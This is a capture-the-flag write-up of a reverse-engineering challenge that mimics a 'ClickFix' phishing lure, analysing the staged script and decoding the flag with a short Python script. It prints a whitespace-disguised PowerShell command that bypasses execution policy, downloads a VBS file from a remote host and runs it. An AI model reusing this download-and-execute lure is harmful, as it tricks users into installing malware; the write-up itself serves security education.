---
description: 'Creator: scuffed'
---

# the fisherman

## Description

{% code overflow="wrap" %}
```
BlahajCTF made "flag.txt" available to you. You may access the document through this link.
```
{% endcode %}

Category: Reverse Engineering (Easy)

## Walkthrough

Navigating to the link, we are first met with this legitimate-looking link verification page, before we're forwarded to the actual page.

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

The initial page that was shown with the 5 seconds redirect timer is actually a legitimate measure implemented by Singapore's Government to protect individuals from being phished when they click on a supposedly-government link. The actual page appears like this

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

And will contain this header at the top

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Going back to the challenge, we can see that the page is claiming that we're being shared a file flag.txt by BlahajCTF, and that to access it, all we have to do is to copy the URL and paste it into File Explorer. If we were to follow these instructions, we would be met with the following warning message.

<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

If we paste the URL into a text editor, we can see the full command being executed.

{% code overflow="wrap" %}
```powershell
cmd.exe /c start /min powershell.exe -ep bypass -C "Invoke-WebRequest http://rev-clickfix.chals.blahaj.sg/update.vbs -OutFile $env:TEMP\LOVELETTERFORYOU.vbs; WScript.exe "$env:TEMP\LOVELETTERFORYOU.vbs" "                                                                                           # C:\blahajCTF\internal-secure\filedrive\flag.txt                                                                    
```
{% endcode %}

This is akin to the "Fake Captcha" social engineering campaigns that pop up from time to time (a blog discussing this attack can be found [here](https://www.splunk.com/en_us/blog/security/unveiling-fake-captcha-clickfix-attacks.html)), where the user is instructed to open their Run menu and paste in the contents of their clipboard, before running the contents to verify that they are not a bot. Here, the code snippet uses PowerShell to download a file "<mark style="color:red;">update.vbs</mark>" and save it to <mark style="color:red;">C:\Windows\Temp\LOVELETTERFORYOU.vbs</mark>, then execute the VBS script with <mark style="color:red;">WScript.exe</mark>. We can curl the website to get the second stage script ourselves, and continue reversing this malware.

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

This VBS code checks if the current system time is set to a specific datetime, and if not it will display the warning message we saw earlier. If it is, it will attempt to decode the encoded flag by increasing or decreasing its ASCII value. We can easily reverse this using the following Python script

```python
encoded_flag = open("flag.enc","r").read()

decoded = ""
for char in encoded_flag:
    ascii_value = ord(char)
    if ascii_value == 123 or ascii_value == 125:
        decoded += char
    elif ascii_value >= 60 and ascii_value <= 85:
        decoded += chr(ascii_value + 5)
    elif ascii_value >= 102 and ascii_value <= 127:
        decoded += chr(ascii_value - 5)
    else:
        decoded += chr(ascii_value)
    
print(decoded)
```

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

## Conclusion

Funnily enough, I actually did fall for this phishing simulation, having just woken up and not thinking much about the largely-legitimate looking link verification website. Coupled with BlahajCTF actually being sponsored by government agencies, and I genuinely believed that they were able to get access to the government link shortener for their own use.&#x20;

It just goes to show that, no matter how skilled or knowledgable we think we are, all it takes is for one slipup and accidental command execution for an attacker to hack into our devices, and to always double and triple check the sites that we are navigating to.&#x20;
